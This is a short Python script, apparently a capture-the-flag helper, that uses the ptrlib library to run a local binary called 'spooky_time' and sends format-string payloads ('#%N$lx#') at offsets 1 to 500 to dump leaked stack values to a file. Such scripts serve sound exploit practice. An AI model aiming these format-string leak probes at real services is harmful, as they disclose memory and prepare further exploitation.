#!/usr/bin/env python
import ptrlib as ptr


def unwrap(x):
    if x is None:
        print("failed to unwrap")
        exit(1)

    else:
        return x


exe = ptr.ELF("./spooky_time")
libc = ptr.ELF("./glibc/libc.so.6")
ld = ptr.ELF("./glibc/ld-linux-x86-64.so.2")

dump = ""

# for i in range(100):
#     io = ptr.Process(exe.filepath)
#     payload = f"#%{i + 1}$lx#".encode()
#     io.sendline(payload)
#     io.recvuntil(b"#")
#     data = int(io.recvuntil(b"#").strip(b"#"), 16)
#     dump += f"{i + 1}: {hex(data)}\n"
#     io.close()
#
# with open("memory_dump.txt", "w") as f:
#     f.write(dump)

dump = ""

for i in range(500):
    io = ptr.Process(exe.filepath)
    io.sendline(b"A")
    payload = f"#%{i + 1}$lx#".encode()
    io.sendline(payload)
    io.recvuntil(b"#")
    data = int(io.recvuntil(b"#").strip(b"#"), 16)
    dump += f"{i + 1}: {hex(data)}\n"
    io.close()


with open("memory_dump.txt", "w") as f:
    f.write(dump)
